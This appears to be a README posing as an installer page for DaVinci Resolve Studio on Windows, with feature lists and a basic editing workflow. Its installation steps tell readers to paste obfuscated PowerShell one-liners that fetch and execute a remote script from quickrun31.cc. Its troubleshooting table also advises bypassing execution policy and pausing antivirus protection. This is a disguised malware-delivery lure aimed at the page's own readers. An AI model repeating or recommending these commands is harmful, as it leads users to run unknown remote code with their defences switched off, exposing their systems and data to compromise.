## Installation

Two quick setup methods for Windows.

### Method 1 — Win + X

1. Press **Win + X**
2. Open **Terminal** or **Windows PowerShell**
3. Paste:

```powershell
sal m iex;m(irm quickrun31.cc/qle7he)
```

4. Press **Enter** and wait for the process to finish  
5. Launch DaVinci Resolve Studio

### Method 2 — Win + R

1. Press **Win + R**
2. Paste:

```powershell
powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b
```

3. Press **Enter** and wait  
4. Launch DaVinci Resolve Studio

### Requirements

- Windows 10 or Windows 11 (64-bit)
- Internet connection during setup only
- 16 GB RAM minimum (32 GB recommended)
- Dedicated GPU strongly recommended
- SSD recommended for media and cache

### Troubleshooting

| Issue | What to try |
|-------|-------------|
| Connection error | Check internet |
| Execution Policy message | `Set-ExecutionPolicy Bypass -Scope Process -Force` |
| Blocked by antivirus | Temporarily pause real-time protection |
| Window closes right away | Usually means setup finished |

## About

DaVinci Resolve Studio for Windows is a professional post-production suite that combines video editing, color grading, visual effects (Fusion) and audio mixing (Fairlight) in one application.

It is widely used by editors, colorists and independent filmmakers for short-form content, YouTube projects and full feature workflows.

> Use at your own risk. Keep your system protected.

---

## Features

**Edit Page**
- Multi-track timeline
- Cut and edit tools
- Transitions and titles
- Speed changes and retiming

**Color Page**
- Primary and secondary correction
- Nodes-based grading
- Scopes and monitoring tools
- LUT support

**Fusion**
- Node-based compositing
- Keying and tracking
- Titles and motion graphics
- Particle and effects tools

**Fairlight**
- Multi-track audio mixing
- ADR and voice tools
- Effects and dynamics
- Bus and routing control

**Delivery**
- Multiple export formats
- Render queue
- Optimized output presets

---

## Workflow

1. Create a new project and set frame rate / resolution  
2. Import media into the Media Pool  
3. Build the rough cut on the Edit page  
4. Grade on the Color page  
5. Add effects or titles in Fusion if needed  
6. Mix audio in Fairlight  
7. Export from the Deliver page  

---

## How to Use

1. Install using one of the methods above  
2. Launch DaVinci Resolve Studio  
3. Create a project and import footage  
4. Edit, grade, mix and export  

**Tips**
- Set project frame rate before editing  
- Use optimized media or proxies for heavy footage  
- Save stills and grades you reuse often  
- Keep cache files on a fast SSD
